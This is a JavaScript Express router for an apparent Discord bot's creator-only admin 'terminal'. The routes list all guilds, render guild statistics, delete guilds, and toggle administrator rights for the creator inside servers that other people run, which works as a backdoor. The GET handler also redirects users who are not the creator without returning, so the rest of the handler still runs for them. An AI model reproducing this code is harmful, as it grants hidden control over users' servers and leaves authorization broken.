const { User, Guild, GuildStatisticsInstance, getDatabase, getLanguagePack, log } = require('../utils');
const { getGuildsList, toggleAdminPermissions, deleteGuild } = require('../discord');
const express = require('express');
const router = express.Router();
const fs = require('fs');
const ejs = require('ejs');

router.get('/', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  !user.isCreator ? response.redirect('/') : null;

  const lang = getLanguagePack(request.cookies.lang);

  const Guilds = await getDatabase("guilds");
  let guilds = await Guilds.find({})
  .toArray();

  guilds = guilds.sort((a, b) => {
    // Перевіряємо isBotAdmin, якщо обидва isBotAdmin дорівнюють false, то сортуємо за кількістю учасників
    if (!a.isBotAdmin && !b.isBotAdmin) {
      return b.members - a.members;
    }
  
    // Якщо тільки один з isBotAdmin дорівнює false, то той, у якого isBotAdmin === false, йде в кінець
    if (!a.isBotAdmin && !a.isFakeGuild) {
      return 1;
    }
    
    if (!b.isBotAdmin && !b.isFakeGuild) {
      return -1;
    }
  
    // Якщо обидва isBotAdmin дорівнюють true, то сортуємо за кількістю учасників
    return b.members - a.members;
  });
  

  const guild = new GuildStatisticsInstance();
  await guild.fetch(guilds.filter(guildDb => !guildDb.isFakeGuild)[0].id);
  guilds.find(guildDb => guildDb.id === guild.id).parsedStatistics = guild.parseStatistics()

  try {
    const terminalData = {
      user,
      guilds,
      lang
    };

    const body = ejs.render(fs.readFileSync('views/terminal.ejs', 'utf8'), terminalData);

    response.render('template.ejs', {
      body,
      user,
      lang
    });
  } catch (error) {
    console.log(error);
    response.redirect('/');
  }
});

router.post('/guild-mode-select', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  if (!user.isCreator) return response.redirect('/');
  
  const lang = getLanguagePack(request.cookies.lang);

  const guild = new GuildStatisticsInstance();
  await guild.fetch(request.body.id);
  guild.parsedStatistics = guild.parseStatistics()
  
  if (guild.id) {
    const body = ejs.render(fs.readFileSync('views/modules/terminal/guild/body.ejs', 'utf8'), { guild, lang });
    log(`Надіслано: ${(body.length / 1024 / 1024 * 8).toFixed(1)} мегабайти`, 'p')
    response.status(200).send(body);
  } else {
    response.status(403).send()
  }
});

router.post('/get-admin-permisson', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  if (!user.isCreator) return response.redirect('/');

  const guild = new Guild();
  await guild.fetch(request.body.id);

  guild.isMiregAdmin = await toggleAdminPermissions(request.body.id, user.id);

  if (guild.id) {
    const body = ejs.render(fs.readFileSync('views/modules/terminal/guild/main-panel-buttons.ejs', 'utf8'), { guild });
    response.status(200).send(body);
    await guild.save();
  } else {
    response.status(403).send()
  }
});

router.post('/delete-guild', async (request, response) => {
  const user = new User();
  await user.fetch(request.cookies.token);
  if (!user.isCreator) return response.redirect('/');

  const guild = new Guild();
  await guild.fetch(request.body.id);

  await deleteGuild(request.body.id);

  if (guild.id) {
    const body = ejs.render(fs.readFileSync('views/modules/terminal/guild/main-panel-buttons.ejs', 'utf8'), { guild });
    response.status(200).send(body);
    await guild.save();
  } else {
    response.status(403).send()
  }
});

module.exports = router;